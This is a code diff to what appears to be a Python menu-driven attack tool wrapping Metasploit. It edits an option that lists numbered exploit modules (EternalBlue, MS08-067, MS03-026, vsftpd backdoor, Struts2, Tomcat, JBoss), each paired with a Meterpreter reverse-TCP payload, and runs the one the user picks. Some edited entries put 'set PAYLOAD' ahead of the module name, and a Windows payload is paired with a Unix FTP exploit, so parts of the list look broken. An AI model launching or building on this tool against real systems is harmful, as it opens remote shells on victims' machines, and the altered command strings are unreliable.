@@ -514,7 +514,9 @@ def metasploit_scan():
                     return
                 metasploit_commands = input(Fore.BLUE + "Enter your Metasploit commands (separated by newlines):\n")
             elif choice == '4':  # View Network Exploits
-                print(Fore.BLUE + "\nrun exploits")
+                print(Fore.BLUE + "\nViewing all network exploits...")
+
+                # Full list of network exploits with payloads
                 exploits = {
                     "11": "exploit/multi/http/tomcat_mgr_upload",
                     "22": "exploit/windows/dcerpc/ms03_026_dcom",
@@ -524,11 +526,11 @@ def metasploit_scan():
                     "66": "exploit/multi/http/jboss_deployment_scanner",
                     "77": "exploit/windows/smb/ms17_010_eternalblue",
                     "108": "exploit/multi/http/tomcat_mgr_upload set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "110": "exploit/windows/dcerpc/ms03_026_dcom set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "112": "exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "114": "exploit/unix/ftp/vsftpd_234_backdoor set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "116": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "118": "exploit/multi/http/jboss_deployment_scanner set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+                    "110": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/dcerpc/ms03_026_dcom",
+                    "112": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/smb/ms08_067_netapi",
+                    "114": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/unix/ftp/vsftpd_234_backdoor",
+                    "116": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/struts2_code_exec",
+                    "118": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/jboss_deployment_scanner",
                     "120": "exploit/windows/smb/ms17_010_eternalblue set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                     "122": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                     "130": "exploit/unix/ftp/vsftpd_234_backdoor set PAYLOAD windows/x64/meterpreter/reverse_tcp",
@@ -541,8 +543,11 @@ def metasploit_scan():
                     "200": "exploit/windows/smb/ms08_067_netapi set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                     "210": "exploit/windows/dcerpc/ms03_026_dcom set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                 }
+
+                # Display available exploits
                 for key, value in exploits.items():
                     print(f"{key}: {value}")
+
                 exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
 
                 if exploit_choice in exploits:
@@ -596,6 +601,7 @@ def metasploit_scan():
 
     except Exception as e:
         print(Fore.RED + f"Error running Metasploit: {e}")
+
 
 
 # Function to run Routersploit
